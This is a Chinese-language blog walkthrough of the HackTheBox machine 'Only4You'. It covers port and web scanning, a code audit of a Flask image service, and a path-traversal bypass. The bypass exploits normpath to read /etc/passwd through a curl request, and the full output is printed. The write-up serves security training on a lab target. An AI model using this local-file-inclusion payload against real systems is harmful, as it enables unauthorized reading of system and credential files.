<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="google-site-verification" content="JleqOUPaJdGpfRPLH4e3NfODV87Fmag6pJBPvxKQKEc"><title>[HTB]  Only4You | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="/js/gitalk.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
 font-family: BenderLight;
 src: local('Bender'), url("/font/BenderLight.ttf");
}
@font-face {
 font-family: 'JetBrains Mono';
 src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Brands';
 src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
}
@font-face {
 font-family: 'Font Awesome 6 Free';
 src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
}</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB]  Only4You</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-07-24T05:43:50.903Z" id="date"> 2023-07-24</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-07-24T14:09:03.195Z" id="updated"> 2023-07-24</time></div></span><br><span>Word Count: <div class="control">7.1k</div></span><br><span>Read Time: <div class="control">37 min</div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='/pic/14726.jpg'><img src="/pic/14726.jpg" alt="14726"></p>
<span id="more"></span>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>好难。再也不填非常简单了。</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nmap -p- --min-rate=10000 10.10.11.210<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 01:40 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> only4you.htb (10.10.11.210)<br>Host is up (0.079s latency).<br>Not shown: 65533 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.29 seconds<br><br>$ sudo nmap -sT -sV -sC -O -p22,80 10.10.11.210<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 01:42 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> only4you.htb (10.10.11.210)<br>Host is up (0.074s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 e8:83:e0:a9:fd:43:<span class="hljs-built_in">df</span>:38:19:8a:aa:35:43:84:11:ec (RSA)<br>|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:<span class="hljs-built_in">cd</span>:08 (ECDSA)<br>|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)<br>80/tcp open  http    nginx 1.18.0 (Ubuntu)<br>|_http-title: Only4you<br>|_http-server-header: nginx/1.18.0 (Ubuntu)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Aggressive OS guesses: Linux 5.0 (97%), Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 2 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 13.15 seconds<br><br>$ sudo nmap --script=vuln 10.10.11.210<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 01:42 EDT<br>Pre-scan script results:<br>| broadcast-avahi-dos:<br>|   Discovered hosts:<br>|     224.0.0.251<br>|   After NULL UDP avahi packet DoS (CVE-2011-1002).<br>|_  Hosts are all up (not vulnerable).<br>Nmap scan report <span class="hljs-keyword">for</span> only4you.htb (10.10.11.210)<br>Host is up (0.076s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>| http-fileupload-exploiter:<br>|<br>|_    Couldn<span class="hljs-string">&#x27;t find a file-type field.</span><br><span class="hljs-string">|_http-dombased-xss: Couldn&#x27;</span>t find any DOM based XSS.<br>| http-csrf:<br>| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=only4you.htb<br>|   Found the following possible CSRF vulnerabilities:<br>|<br>|     Path: http://only4you.htb:80/<br>|     Form <span class="hljs-built_in">id</span>: name<br>|_    Form action: /<br>|_http-stored-xss: Couldn<span class="hljs-string">&#x27;t find any stored XSS vulnerabilities.</span><br><span class="hljs-string"></span><br><span class="hljs-string">Nmap done: 1 IP address (1 host up) scanned in 233.63 seconds</span><br></code></pre></td></tr></table></figure>

<p>看了22和80，那就80吧。</p>
<h3 id="nikto"><a href="#nikto" class="headerlink" title="nikto"></a>nikto</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nikto -h 10.10.11.210<br>- Nikto v2.5.0<br>---------------------------------------------------------------------------<br>+ Target IP:          10.10.11.210<br>+ Target Hostname:    10.10.11.210<br>+ Target Port:        80<br>+ Start Time:         2023-07-24 01:43:02 (GMT-4)<br>---------------------------------------------------------------------------<br>+ Server: nginx/1.18.0 (Ubuntu)<br>+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options<br>+ /: The X-Content-Type-Options header is not <span class="hljs-built_in">set</span>. This could allow the user agent to render the content of the site <span class="hljs-keyword">in</span> a different fashion to the MIME <span class="hljs-built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/<br>+ Root page / redirects to: http://only4you.htb/<br>+ No CGI Directories found (use <span class="hljs-string">&#x27;-C all&#x27;</span> to force check all possible <span class="hljs-built_in">dirs</span>)<br>+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).<br>+ 8074 requests: 0 error(s) and 3 item(s) reported on remote host<br>+ End Time:           2023-07-24 01:53:38 (GMT-4) (636 seconds)<br>---------------------------------------------------------------------------<br>+ 1 host(s) tested<br><br></code></pre></td></tr></table></figure>

<p>暂时没啥发现。</p>
<h3 id="whatweb"><a href="#whatweb" class="headerlink" title="whatweb"></a>whatweb</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo whatweb http://only4you.htb<br>http://only4you.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[info@only4you.htb], Frame, HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.210], Lightbox, Script, Title[Only4you], nginx[1.18.0]<br></code></pre></td></tr></table></figure>



<h2 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h2><h3 id="手动访问网站"><a href="#手动访问网站" class="headerlink" title="手动访问网站"></a>手动访问网站</h3><p>我们把only4you.htb加入hosts中，访问一下看看。</p>
<p class='item-img' data-src='/pic/assets/e87ecf411dde4488211e1e0b1c599daf.png'><img src="/pic/assets/e87ecf411dde4488211e1e0b1c599daf.png" alt="e87ecf411dde4488211e1e0b1c599daf"></p>
<p>搞的像模像样，其实实际上没几个按钮是有用的。我们再四处看看。</p>
<p>在QA里面里第三个问题的here处找到一个可以跳转的子域名。</p>
<p class='item-img' data-src='/pic/assets/5ea1297a1bcae8c821d8e1e478f04724.png'><img src="/pic/assets/5ea1297a1bcae8c821d8e1e478f04724.png" alt="5ea1297a1bcae8c821d8e1e478f04724"></p>
<p>我们把beta.only4you.htb也加入hosts中，访问一下看看。</p>
<p class='item-img' data-src='/pic/assets/040e0489aba7ae7d1734b2f8efc01a06.png'><img src="/pic/assets/040e0489aba7ae7d1734b2f8efc01a06.png" alt="040e0489aba7ae7d1734b2f8efc01a06"></p>
<p>发现是一个网站展示他们产品的网页，他甚至还提供了源代码，那我们下载下来看看吧。</p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>我们大体看一下源代码就可以知道，其实就是一个很简单的，用flask跑了一个网站服务器，在上面部署了重新调整图片大小以及转换图片的功能罢了。在beta.only4you.htb上也有对应的服务页面。</p>
<p class='item-img' data-src='/pic/assets/e7c48d6b191ae4e53452a41de211652f.png'><img src="/pic/assets/e7c48d6b191ae4e53452a41de211652f.png" alt="e7c48d6b191ae4e53452a41de211652f"></p>
<p class='item-img' data-src='/pic/assets/cac37a5b60df1328805fc4cf98724bcd.png'><img src="/pic/assets/cac37a5b60df1328805fc4cf98724bcd.png" alt="cac37a5b60df1328805fc4cf98724bcd"></p>
<p>我们明显可以发现这两个服务还提供文件上传功能，那我们是不是可以利用呢？那得细看一下源代码。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/resize&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">resize</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            flash(<span class="hljs-string">&#x27;Something went wrong, Try again!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(request.url)<br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        img = secure_filename(file.filename)<br>        <span class="hljs-keyword">if</span> img != <span class="hljs-string">&#x27;&#x27;</span>:<br>            ext = os.path.splitext(img)[<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">if</span> ext <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> app.config[<span class="hljs-string">&#x27;UPLOAD_EXTENSIONS&#x27;</span>]:<br>                flash(<span class="hljs-string">&#x27;Only png and jpg images are allowed!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>                <span class="hljs-keyword">return</span> redirect(request.url)    <br>            file.save(os.path.join(app.config[<span class="hljs-string">&#x27;RESIZE_FOLDER&#x27;</span>], img))<br>            status = resizeimg(img)<br>            <span class="hljs-keyword">if</span> status == <span class="hljs-literal">False</span>:<br>                flash(<span class="hljs-string">&#x27;Image is too small! Minimum size needs to be 700x700&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>                <span class="hljs-keyword">return</span> redirect(request.url)<br>            <span class="hljs-keyword">else</span>:<br>                flash(<span class="hljs-string">&#x27;Image is succesfully uploaded!&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&#x27;No image selected!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(request.url)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;resize.html&#x27;</span>, clicked=<span class="hljs-string">&quot;True&quot;</span>), &#123;<span class="hljs-string">&quot;Refresh&quot;</span>: <span class="hljs-string">&quot;5; url=/list&quot;</span>&#125;<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;resize.html&#x27;</span>, clicked=<span class="hljs-string">&quot;False&quot;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/convert&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            flash(<span class="hljs-string">&#x27;Something went wrong, Try again!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(request.url)<br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        img = secure_filename(file.filename)<br>        <span class="hljs-keyword">if</span> img != <span class="hljs-string">&#x27;&#x27;</span>:<br>            ext = os.path.splitext(img)[<span class="hljs-number">1</span>]<br>            <span class="hljs-keyword">if</span> ext <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> app.config[<span class="hljs-string">&#x27;UPLOAD_EXTENSIONS&#x27;</span>]:<br>                flash(<span class="hljs-string">&#x27;Only jpg and png images are allowed!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>                <span class="hljs-keyword">return</span> redirect(request.url)    <br>            file.save(os.path.join(app.config[<span class="hljs-string">&#x27;CONVERT_FOLDER&#x27;</span>], img))<br>            <span class="hljs-keyword">if</span> ext == <span class="hljs-string">&#x27;.png&#x27;</span>:<br>                image = convertpj(img)<br>                <span class="hljs-keyword">return</span> send_from_directory(app.config[<span class="hljs-string">&#x27;CONVERT_FOLDER&#x27;</span>], image, as_attachment=<span class="hljs-literal">True</span>)<br>            <span class="hljs-keyword">else</span>:<br>                image = convertjp(img)<br>                <span class="hljs-keyword">return</span> send_from_directory(app.config[<span class="hljs-string">&#x27;CONVERT_FOLDER&#x27;</span>], image, as_attachment=<span class="hljs-literal">True</span>)<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&#x27;No image selected!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(request.url) <br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;convert.html&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        [f.unlink() <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> Path(app.config[<span class="hljs-string">&#x27;CONVERT_FOLDER&#x27;</span>]).glob(<span class="hljs-string">&quot;*&quot;</span>) <span class="hljs-keyword">if</span> f.is_file()]<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;convert.html&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>看了一下，<code> img = secure_filename(file.filename)</code>以及<code>ext = os.path.splitext(img)[1]</code>这两条把我们限制的比较难受，不太好利用。但是天无绝人之路，往下看看发现<code>/download</code>更有利用的可能性。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    image = request.form[<span class="hljs-string">&#x27;image&#x27;</span>]<br>    filename = posixpath.normpath(image) <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">or</span> filename.startswith(<span class="hljs-string">&#x27;../&#x27;</span>):<br>        flash(<span class="hljs-string">&#x27;Hacking detected!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/list&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isabs(filename):<br>        filename = os.path.join(app.config[<span class="hljs-string">&#x27;LIST_FOLDER&#x27;</span>], filename)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(filename):<br>            flash(<span class="hljs-string">&#x27;Image doesn\&#x27;t exist!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/list&#x27;</span>)<br>    <span class="hljs-keyword">except</span> (TypeError, ValueError):<br>        <span class="hljs-keyword">raise</span> BadRequest()<br>    <span class="hljs-keyword">return</span> send_file(filename, as_attachment=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p>表面上代码<code>posixpath.normpath(image)</code>来规范化路径，避免路径遍历，也用了<code>if &#39;..&#39; in filename or filename.startswith(&#39;../&#39;)</code>来避免路径遍历。第一次有了<code>posixpath.normpath</code>和<code>..</code>匹配，本来是两件很美好的事情，加在一起为什么会变成这样。实际上，<code>posixpath.normpath</code>把这变成马奇诺防线了，我们可以写个脚本测试一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">cat</span> test.py<br>import posixpath<br><br><span class="hljs-keyword">while</span> 1:<br>    image = input(<span class="hljs-string">&#x27;file:&#x27;</span>)<br>    filename = posixpath.normpath(image)<br>    <span class="hljs-built_in">print</span>(filename)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;..&#x27;</span> <span class="hljs-keyword">in</span> filename or filename.startswith(<span class="hljs-string">&#x27;../&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Hacking detected!&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Good&#x27;</span>)<br><br>$ python test.py<br>file:../../etc/passwd<br>../../etc/passwd<br>Hacking detected!<br>file:/etc/passwd<br>/etc/passwd<br>Good<br>file:./etc/passwd<br>etc/passwd<br>Good<br>file:/.././etc/passwd<br>/etc/passwd<br>Good<br></code></pre></td></tr></table></figure>

<p>我们可以看到，<code>posixpath.normpath</code>本意是把路径规范化，把多余的什么<code>../</code>以及<code>.</code>等多余的路径都删掉剩下最后路径。结果显然后面的匹配就没意义了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://beta.only4you.htb/download --data <span class="hljs-string">&quot;image=/../etc/passwd&quot;</span><br>root:x:0:0:root:/root:/bin/bash<br>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>sys:x:3:3:sys:/dev:/usr/sbin/nologin<br><span class="hljs-built_in">sync</span>:x:4:65534:<span class="hljs-built_in">sync</span>:/bin:/bin/sync<br>games:x:5:60:games:/usr/games:/usr/sbin/nologin<br>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br>systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br>systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br>systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br>messagebus:x:103:106::/nonexistent:/usr/sbin/nologin<br>syslog:x:104:110::/home/syslog:/usr/sbin/nologin<br>_apt:x:105:65534::/nonexistent:/usr/sbin/nologin<br>tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false<br>uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin<br>tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin<br>landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin<br>pollinate:x:110:1::/var/cache/pollinate:/bin/false<br>usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br>sshd:x:112:65534::/run/sshd:/usr/sbin/nologin<br>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br>john:x:1000:1000:john:/home/john:/bin/bash<br>lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false<br>mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false<br>neo4j:x:997:997::/var/lib/neo4j:/bin/bash<br>dev:x:1001:1001::/home/dev:/bin/bash<br>fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin<br>_laurel:x:996:996::/var/log/laurel:/bin/false<br></code></pre></td></tr></table></figure>

<p>实际上我们直接<code>--data &quot;image=/etc/passwd&quot;</code>也可以看到。</p>
<h3 id="LFI利用"><a href="#LFI利用" class="headerlink" title="LFI利用"></a>LFI利用</h3><p>我们验证了LFI漏洞的存在，但是我们要怎么利用呢？我们要看哪些文件？其实很自然的，我们现在看到了子域名beta网站的源代码，发现了漏洞，那我们能不能看看主站的源代码呢？那我们就需要知道具体的路径了。当然前面基本上是<code>/var/www/</code>没差了，我们试了下常见的<code>html</code>也不对，光在这猜也是不是个事，那我们就要想哪些东西的路径是相对固定的，没错，日志。我们之前whatweb以及扫描都发现了网站是基于nginx的，我们知道nginx的日志分为访问日志和错误日志，默认路径分别是<code>/var/log/nginx/access.log</code>以及<code>/var/log/nginx/error.log</code>。我们可以都看看。</p>
<p>access log一堆乱七八糟的记录，不想看，看看远处的error log：</p>
